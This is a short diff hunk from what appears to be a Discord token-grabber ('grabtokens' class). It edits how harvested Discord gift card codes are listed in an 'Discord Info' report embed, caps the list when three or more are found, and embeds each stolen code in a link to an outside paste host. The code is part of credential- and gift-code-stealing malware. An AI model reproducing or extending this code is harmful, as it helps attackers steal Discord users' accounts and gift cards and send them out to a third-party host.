@@ -303,9 +303,15 @@ class grabtokens():
                     
             if val_codes == []:
                 val += f'\n:gift: **No Gift Cards Found**\n'
+            elif len(val_codes) >= 3:
+                num = 0
+                for c, t in val_codes:
+                    num += 1
+                    if num == 3:
+                        break
+                    val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
             else:
                 for c, t in val_codes:
-
                     val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
             embed.add_field(name="Discord Info", value=val + "\u200b", inline=False)
